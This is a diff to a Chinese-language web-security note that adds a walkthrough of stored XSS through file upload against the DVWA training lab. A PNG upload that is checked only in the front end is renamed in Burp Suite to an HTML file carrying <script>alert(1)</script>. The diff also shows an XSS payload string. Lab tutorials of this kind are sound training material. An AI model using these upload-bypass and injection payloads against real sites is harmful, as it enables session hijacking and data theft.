@@ -1,3 +1,5 @@
+注入恶意脚本，窃取目标数据。
+
 ## 1 嵌入式 XSS
 
 在文件中嵌入恶意脚本后上传，当目标加载文件时会触发 XSS 攻击。
@@ -8,6 +10,31 @@
 >
 > 访问 PDF-XSS 链接时的请求参数不能随意删除，否则无法触发
 
+若目标仅在前端校验可上传一张 PNG 文件，然后在 Burp Suite 中修改为 HTML
+
+```http
+Content-Disposition: form-data; name="uploaded"; filename="XSS.png"
+
+ PNG
+```
+
+```http
+Content-Disposition: form-data; name="uploaded"; filename="XSS.html"
+
+ PNG
+<script>alert(1)</script>
+```
+
+从 Burp Suite 中查找关键词 XSS.html 得到路径后访问 URL 即可触发 XSS
+
+```
+../../hackable/uploads/XSS.html succesfully uploaded!
+```
+
+```
+http://debian.local/dvwa/hackable/uploads/XSS.html
+```
+
 ---
 
 参考链接
@@ -17,7 +44,7 @@
 
 ## ==未归纳==
 
-XSS（跨站脚本漏洞）是一种通过注入恶意脚本（通常是 JavaScript）到可信网站或应用程序中，诱使其他用户在其浏览器中执行，从而窃取数据、劫持会话或执行恶意操作的安全漏洞。
+
 
 ```html
 "><script>alert(1)</script>
